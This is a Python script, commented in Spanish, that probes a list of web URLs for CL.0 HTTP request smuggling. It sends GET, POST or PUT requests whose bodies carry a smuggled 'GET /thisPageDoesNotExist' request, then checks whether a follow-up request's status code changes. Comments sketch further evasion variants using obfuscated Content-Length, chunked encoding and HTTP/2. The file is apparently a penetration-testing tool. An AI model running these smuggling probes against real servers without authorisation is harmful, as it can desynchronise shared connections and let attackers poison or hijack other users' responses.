#! /usr/bin/env python3
import sys
import requests
#import urllib.parse as urlparse
import argparse
from urllib.parse import urlparse as parse
import logging
requests.packages.urllib3.disable_warnings()

#Try TE0
#Requests que generan Redirects + Recursos estaticos (GETs) + Generar errores para forzar el no procesamiento de un Content-Length
#Add H2.0
#GET requests con tecnicas de ofuscacion del CL (Regilero + ReqSmuggler)
#Transfer-Encoding: chunked

#2c
#GET /resources/images/blog.svg HTTP/1.1
#Foo: Bar


#try:
#    from http.client import HTTPConnection
#except ImportError:
#    from httplib import HTTPConnection
#HTTPConnection.debuglevel = 1

parser = argparse.ArgumentParser()
#parser.add_argument('-t','--target', help='host/ip to target', required=True)
parser.add_argument('-u','--urlFile', help='file with urls to test from specific host', required=True)
args = parser.parse_args()

#CL0Host = args.target.strip()
URLFilePath = args.urlFile.strip()

#Session config
proxies = {'http': '127.0.0.1:8080','https': '127.0.0.1:8080'}
session = requests.Session()
#session.proxies = proxies
session.allow_redirects = False
session.stream = True

URLs = open(URLFilePath, "r")
for url in URLs:
    CandidateMethod = url.split("---")[1]
    FullUrl = parse(url.split("---")[0])
    NormalRespCode = url.split("---")[2]
    CL0Scheme = FullUrl.scheme
    CL0Host = FullUrl.netloc
    CL0TestPath = FullUrl.path
    CL0ResultPath = FullUrl.path
    CL0TestBody = 'GET /thisPageDoesNotExist HTTP/1.1\r\nFoo: Bar'
    if(CandidateMethod == 'GET'):#We send the second get always, as the same request can appear several times with different methods
        CL0Test = session.get(CL0Scheme + "://" + CL0Host + CL0TestPath, data=CL0TestBody, allow_redirects=False)
        CL0Result = session.get(CL0Scheme + "://" + CL0Host + CL0ResultPath, allow_redirects=False)
    elif(CandidateMethod == 'POST'):
        CL0Test = session.post(CL0Scheme + "://" + CL0Host + CL0TestPath, data=CL0TestBody, allow_redirects=False)
        CL0Result = session.get(CL0Scheme + "://" + CL0Host + CL0ResultPath, allow_redirects=False)
    else: #PUT
        CL0Test = session.put(CL0Scheme + "://" + CL0Host + CL0TestPath, data=CL0TestBody, allow_redirects=False)
        CL0Result = session.get(CL0Scheme + "://" + CL0Host + CL0ResultPath, allow_redirects=False)
    print("[%s] - The response code for %s is %s and after CL0 is %s for method %s" % (NormalRespCode,CL0TestPath,str(CL0Test.status_code),str(CL0Result.status_code),CandidateMethod))
